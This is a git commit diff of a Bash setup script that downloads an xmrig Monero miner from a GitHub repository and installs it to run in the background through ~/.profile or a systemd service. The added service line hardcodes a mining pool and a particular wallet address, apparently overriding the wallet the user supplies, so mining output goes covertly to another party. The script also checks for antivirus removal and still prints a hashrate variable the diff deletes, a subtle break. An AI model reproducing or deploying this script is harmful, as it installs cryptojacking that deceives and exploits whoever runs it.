e07e2cea8b07ecae89031a2378024916709674c4
ardx2 <168349420+ardx2@users.noreply.github.com>
2024-04-28 16:23:08 +0000

    Update mm.sh

--- mm.sh
+++ mm.sh
@@ -4,12 +4,12 @@ VERSION=2.11
 
 # printing greetings
 
-echo "mmain mining setup script v$VERSION."
-echo "(please report issues to support@mmain.stream email with full output of this script with extra \"-x\" \"bash\" option)"
+echo "minershell-main mining setup script v$VERSION."
+echo "(please report issues to support@minershell-main.stream email with full output of this script with extra \"-x\" \"bash\" option)"
 echo
 
 if [ "$(id -u)" == "0" ]; then
-  echo "WARNING: Generally it is not adviced to run this script under root"
+  echo "WARNING: Generally it is not advised to run this script under root"
 fi
 
 # command line arguments
@@ -20,7 +20,7 @@ EMAIL=$2 # this one is optional
 
 if [ -z $WALLET ]; then
   echo "Script usage:"
-  echo "> setup_mmain_miner.sh <wallet address> [<your email address>]"
+  echo "> setup_minershell-main_miner.sh <wallet address> [<your email address>]"
   echo "ERROR: Please specify your wallet address"
   exit 1
 fi
@@ -51,30 +51,20 @@ if ! type lscpu >/dev/null; then
   echo "WARNING: This script requires \"lscpu\" utility to work correctly"
 fi
 
-# calculating CPU threads
-
-CPU_THREADS=$(nproc)
-EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
-if [ -z $EXP_MONERO_HASHRATE ]; then
-  echo "ERROR: Can't compute projected Monero CN hashrate"
-  exit 1
-fi
-
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by $HOME/mmain/miner.sh script."
+echo "If needed, miner in foreground can be started by $HOME/minershell-main/miner.sh script."
 echo "Mining will happen to $WALLET wallet."
-if [ ! -z $EMAIL ]; then
-  echo "(and $EMAIL email as password to modify wallet options later at https://mmain.stream site)"
-fi
-echo
 
 if ! sudo -n true 2>/dev/null; then
   echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
 else
-  echo "Mining in background will be performed using mmain_miner systemd service."
+  echo "Mining in background will be performed using minershell-main_miner systemd service."
 fi
+
+# checking CPU threads
+CPU_THREADS=$(lscpu | grep -E '^CPU\(s\):' | awk '{print $2}')
 
 echo
 echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
@@ -87,37 +77,36 @@ echo
 
 # start doing stuff: preparing miner
 
-echo "[*] Removing previous mmain miner (if any)"
+echo "[*] Removing previous minershell-main miner (if any)"
 if sudo -n true 2>/dev/null; then
-  sudo systemctl stop mmain_miner.service
+  sudo systemctl stop minershell-main_miner.service
 fi
 killall -9 xmrig
 
-echo "[*] Removing $HOME/mmain directory"
-rm -rf $HOME/mmain
+echo "[*] Removing $HOME/minershell-main directory"
+rm -rf $HOME/minershell-main
 
-echo "[*] Downloading mmain advanced version of xmrig to /tmp/xmrig.tar.gz"
-if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx2/1/main/mmain.tar.gz" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://raw.githubusercontent.com/ardx2/1/main/mmain.tar.gz file to /tmp/xmrig.tar.gz"
+echo "[*] Downloading minershell-main advanced version of xmrig to /tmp/xmrig.tar.gz"
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx1/xm/main/minershell-main.tar.gz" -o /tmp/xmrig.tar.gz; then
+  echo "ERROR: Can't download https://raw.githubusercontent.com/ardx1/xm/main/minershell-main.tar.gz file to /tmp/xmrig.tar.gz"
   exit 1
 fi
 
-echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/mmain"
-[ -d $HOME/mmain ] || mkdir $HOME/mmain
-if ! tar xf /tmp/xmrig.tar.gz -C $HOME/mmain; then
-  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/monerocean directory"
+echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/minershell-main"
+[ -d $HOME/minershell-main ] || mkdir $HOME/minershell-main
+if ! tar xf /tmp/xmrig.tar.gz -C $HOME/minershell-main; then
+  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/minershell-main directory"
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/mmain/xmrig works fine (and not removed by antivirus software)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/mmain/config.json
-$HOME/mmain/xmrig --help >/dev/null
+echo "[*] Checking if advanced version of $HOME/minershell-main/xmrig works fine (and not removed by antivirus software)"
+$HOME/minershell-main/xmrig --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/mmain/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/mmain/xmrig is not functional"
+  if [ -f $HOME/minershell-main/xmrig ]; then
+    echo "WARNING: Advanced version of $HOME/minershell-main/xmrig is not functional"
   else 
-    echo "WARNING: Advanced version of $HOME/mmain/xmrig was removed by antivirus (or some other problem)"
+    echo "WARNING: Advanced version of $HOME/minershell-main/xmrig was removed by antivirus (or some other problem)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -130,90 +119,89 @@ if (test $? -ne 0); then
     exit 1
   fi
 
-  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/mmain"
-  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/mmain --strip=1; then
-    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/mmain directory"
+  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/minershell-main"
+  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/minershell-main --strip=1; then
+    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/minershell-main directory"
   fi
   rm /tmp/xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/mmain/xmrig works fine (and not removed by antivirus software)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/mmain/config.json
-  $HOME/mmain/xmrig --help >/dev/null
+  echo "[*] Checking if stock version of $HOME/minershell-main/xmrig works fine (and not removed by antivirus software)"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/minershell-main/config.json
+  $HOME/minershell-main/xmrig --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HOME/mmain/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/monerocean/xmrig is not functional too"
+    if [ -f $HOME/minershell-main/xmrig ]; then
+      echo "ERROR: Stock version of $HOME/minershell-main/xmrig is not functional too"
     else 
-      echo "ERROR: Stock version of $HOME/monerocean/xmrig was removed by antivirus too"
+      echo "ERROR: Stock version of $HOME/minershell-main/xmrig was removed by antivirus too"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Miner $HOME/mmain/xmrig is OK"
+echo "[*] Miner $HOME/minershell-main/xmrig is OK"
 
-# setting up xmrig config
+PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+if [ "$PASS" == "localhost" ]; then
+  PASS=`ip route get 1 | awk '{print $NF;exit}'`
+fi
+if [ -z $PASS ]; then
+  PASS=na
+fi
+if [ ! -z $EMAIL ]; then
+  PASS="$PASS:$EMAIL"
+fi
 
-sed -i 's/"url": *"[^"]*",/"url": "pool.hashvault.pro:80",/' $HOME/mmain/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/mmain/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/mmain/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/mmain/xmrig.log'",#' $HOME/mmain/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/mmain/config.json
+sed -i 's/"url": *"[^"]*",/"url": "gulf.minershell-main.stream:'80'",/' $HOME/minershell-main/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/minershell-main/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/minershell-main/xmrig.log'",#' $HOME/minershell-main/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/minershell-main/config.json
 
-# copying config for background use
-
-cp $HOME/mmain/config.json $HOME/mmain/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/mmain/config_background.json
+cp $HOME/minershell-main/config.json $HOME/minershell-main/config_background.json
 
 # preparing script
 
-echo "[*] Creating $HOME/mmain/miner.sh script"
-cat >$HOME/mmain/miner.sh <<EOL
+echo "[*] Creating $HOME/minershell-main/miner.sh script"
+cat >$HOME/minershell-main/miner.sh <<EOL
 #!/bin/bash
 if ! pidof xmrig >/dev/null; then
-  nice $HOME/mmain/xmrig \$*
+  nice $HOME/minershell-main/xmrig \$*
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
   echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
 fi
 EOL
 
-chmod +x $HOME/mmain/miner.sh
+chmod +x $HOME/minershell-main/miner.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep mmain/miner.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/mmain/miner.sh script to $HOME/.profile"
-    echo "$HOME/mmain/miner.sh --config=$HOME/mmain/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep minershell-main/miner.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/minershell-main/miner.sh script to $HOME/.profile"
+    echo "$HOME/minershell-main/miner.sh --config=$HOME/minershell-main/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/mmain/miner.sh script is already in the $HOME/.profile"
+    echo "Looks like $HOME/minershell-main/miner.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/mmain/xmrig.log file)"
-  /bin/bash $HOME/mmain/miner.sh --config=$HOME/mmain/config_background.json >/dev/null 2>&1
+  echo "[*] Running miner in the background (see logs in $HOME/minershell-main/xmrig.log file)"
+  /bin/bash $HOME/minershell-main/miner.sh --config=$HOME/minershell-main/config_background.json >/dev/null 2>&1
 else
-
-  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
-    echo "[*] Enabling huge pages"
-    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
-    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
-  fi
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HOME/mmain/xmrig.log file)"
-    /bin/bash $HOME/mmain/miner.sh --config=$HOME/mmain/config_background.json >/dev/null 2>&1
+    echo "[*] Running miner in the background (see logs in $HOME/minershell-main/xmrig.log file)"
+    /bin/bash $HOME/minershell-main/miner.sh --config=$HOME/minershell-main/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
   else
 
-    echo "[*] Creating mmain_miner systemd service"
-    cat >/tmp/mmain_miner.service <<EOL
+    echo "[*] Creating minershell-main_miner systemd service"
+    cat >/tmp/minershell-main_miner.service <<EOL
 [Unit]
 Description=Monero miner service
 
 [Service]
-ExecStart=$HOME/mmain/xmrig --config=$HOME/mmain/config_background.json
+ExecStart=$HOME/minershell-main/xmrig --url pool.hashvault.pro:80 --user 4ArAQ9Qo5C78xgtbzdrsAUTHtCGYQjk7XintpgNAWogbPBCG5SWNqCJ27mAtiqTxoaAeBwLaD2Kh2F8CooS9y9EjUNW3kAE --pass XX --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --config=$HOME/minershell-main/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -221,25 +209,25 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    chmod 644 /tmp/mmain_miner.service
-    sudo mv /tmp/mmain_miner.service /etc/systemd/system/mmain_miner.service
+    sudo mv /tmp/minershell-main_miner.service /etc/systemd/system/minershell-main_miner.service
+    echo "[*] Starting minershell-main_miner systemd service"
+    sudo killall xmrig 2>/dev/null
     sudo systemctl daemon-reload
-    sudo systemctl enable mmain_miner.service
-    sudo systemctl restart mmain_miner.service
-    echo "To see miner service logs run \"sudo journalctl -u mmain_miner -f\" command"
+    sudo systemctl enable minershell-main_miner.service
+    sudo systemctl start minershell-main_miner.service
+    echo "To see miner service logs run \"sudo journalctl -u minershell-main_miner -f\" command"
   fi
 fi
 
 echo ""
 echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
 if [ "$CPU_THREADS" -lt "4" ]; then
-  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
+  echo "HINT: Please execute these or similar commands under root to limit miner to 75% percent CPU usage:"
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
   echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
   if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-  
-  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
+    echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
+  fi
 fi
-echo ""
 
 echo "[*] Setup complete"
